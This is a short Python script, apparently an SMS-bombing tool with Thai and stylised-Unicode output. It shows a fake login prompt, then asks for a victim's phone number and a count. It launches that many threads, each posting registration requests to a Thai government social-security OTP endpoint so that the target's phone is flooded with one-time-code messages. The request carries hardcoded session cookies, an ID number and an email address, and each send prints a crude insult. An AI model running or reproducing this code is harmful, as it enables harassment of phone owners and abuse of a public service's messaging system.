# pkg update
# pip install pyfiglet
# pip install bs4
import requests,json
import random
import os
import time
import threading
from requests import get
from re import search
from requests import Session
from threading import Thread
os.system("clear")
print("")
print("\033[1;93mเครดิต \033[1;96m𝕭𝖞 𝕭𝖊𝕭𝖔𝖘𝖘")
print("")
print ("\033[95m𝙃𝙚𝙚𝙚𝙚𝙚")
print("")
print("")
phone= input("\033[91m𝙐𝙨𝙚𝙧𝙣𝙖𝙢𝙚 : \033[92m")

print("")
print("")
phone= input("\033[1;94m𝙋𝙖𝙨𝙨𝙬𝙤𝙧𝙙 : \033[92m")

print("")
print("\033[91m𝗘𝗥𝗥𝗢𝗥:(")

print("")
print("\033[95m𝐭𝐫𝐲 𝐚𝐠𝐚𝐢𝐧")

print("")
print("")

phone= input("\033[91m𝙐𝙨𝙚𝙧𝙣𝙖𝙢𝙚 : \033[91m")

print("")
print("")

phone=input("\033[1;94m𝙋𝙖𝙨𝙨𝙬𝙤𝙧𝙙 : \033[91m")
print("")
print("")
print("\033[92m𝘀𝘂𝗰𝗰𝗲𝗲𝗱")

print("")
print("")

phone = input("\033[1;93m𝗣𝗵𝗼𝗻𝗲 𝗡𝘂𝗺𝗯𝗲𝗿 : \033[1;93m")
print ("")
print ("")
jam = int(input("\033[1;96m𝗛𝗼𝘄 𝗺𝗮𝗻𝘆 : \033[1;96m"))
print("")

def ao():
	requests.post('https://www.sso.go.th/wpr/MEM/terminal/ajax_send_otp',headers = {"User-Agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With": "XMLHttpRequest","Cookie": "sso_local_storeci_sessions=KHj9a18RowgHYWbh71T2%2FDFAcuC2%2FQaJkguD3MQ1eh%2FlwrUXvpAjJgrm6QKAja4oe7rglht%2BzO6oqblJ4EMJF4pqnY%2BGtR%2F0RzIFGN0Suh1DJVRCMPpP8QtZsF5yDyw6ibCMf2HXs95LvAMi7KUkIeaWkSahmh5f%2F3%2FqcOQ2OW5yakrMGA1mJ5upBZiUdEYNmxUAljcqrg7P3L%2BGAXxxC2u1bO09Oz4qf4ZV9ShO0gz5p5CbkE7VxIq1KUrEavn9Y%2BarQmsh1qIIc51uvCev1U1uyXfC%2F9U7uRl7x%2FVYZYT2pkLd3Q7qnZoSNBL8y9wge8Lt7grySdVLFhw9HB68dTSiOm1K04QhdrprI7EsTLWDHTgYmgyTQDuz63YjHsH5MUVanlfBISU1WXmRTXMKbUjlcl0LPPYUR9KWzrVL7sXcrCX%2FfUwLJIU%2F7MTtDYUx39y1CAREM%2F8dw7AEjcJAOA%3D%3D684b65b9b9dc33a3380c5b121b6c2b3ecb6f1bec; PHPSESSID=1s2rdo0664qpg4oteil3hhn3v2; TS01ac2b25=01584aa399fbfcc6474d383fdc1405e05eaa529fa33e596e5189664eb7dfefe57b927d8801ad40fba49f0adec4ce717dd5eabf08d7080e2b85f34368a92a47e71ef07861a287c40da15c0688649509d7f97eb2c293; _ga=GA1.3.1824294570.1636876684; _gid=GA1.3.1832635291.1636876684"},data=f"dCard=1358231116147&Mobile={phone}&password=098098Az&repassword=098098Az&perPrefix=Mr.&cn=Dhdhhs&sn=Vssbsh&perBirthday=5&perBirthmonth=5&perBirthyear=2545&Email=nickytom5879%40gmail.com&otp_type=OTP&otpvalue=&messageId=REGISTER")
	print("\033[91mยิงหีเเม่มึงแล้วครับ By: \033[1;96m𝕭𝖊𝕭𝖔𝖘𝖘")
	
for i in range(jam):
	threading.Thread(target=ao).start()